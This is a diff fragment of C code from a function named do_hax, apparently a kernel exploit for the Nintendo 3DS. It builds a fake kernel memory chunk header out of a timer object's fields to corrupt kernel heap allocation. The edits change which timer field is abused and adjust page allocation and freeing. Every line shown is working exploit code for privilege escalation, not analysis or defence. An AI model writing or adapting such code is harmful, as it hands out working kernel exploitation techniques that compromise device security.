@@ -127,7 +127,7 @@ void do_hax() {
     svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
     svcControlMemory(&tmp, memAddr + memSize, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
 
-    // Create a timer, crafting a fake MemChunkHdr out of its data.
+    // Create a timer in order to use part of its data as a fake memory block header.
     // Prev does not matter, as any verification happens prior to the overwrite.
     // However, next must be 0, as it does not use size to check when allocation is finished.
     // If next is not 0, it will continue to whatever is pointed to by it.
@@ -136,11 +136,10 @@ void do_hax() {
     Handle timer;
     u32 timerAddr;
     svcCreateTimerKAddr(&timer, 0, &timerAddr);
-    svcSetTimer(timer, 0, 0);
 
     // Retrieve the timer object and create a pointer to our fake header.
     KTimer* timerObj = (KTimer*) (timerAddr - 4);
-    MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->timerEnabled;
+    MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->refCount;
 
     // Debug output.
     printf("Timer object: 0x%08X\n", (int) timerObj);
@@ -169,6 +168,9 @@ void do_hax() {
     // Wait for memory mapping to complete.
     wait_map_complete();
 
+    // Free the isolating page, as we don't need it anymore.
+    svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
+
     // Restore the kernel page backup.
     //memcpy((void*) (memAddr + PAGE_SIZE), backup, PAGE_SIZE);
 
@@ -189,9 +191,8 @@ void do_hax() {
     // Free the timer.
     svcCloseHandle(timer);
 
-    // Free the allocated pages.
+    // Free the mapped pages.
     svcControlMemory(&tmp, memAddr, 0, memSize, MEMOP_FREE, MEMPERM_DONTCARE);
-    svcControlMemory(&tmp, memAddr + memSize + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
 }
 
 int main(int argc, char **argv) {
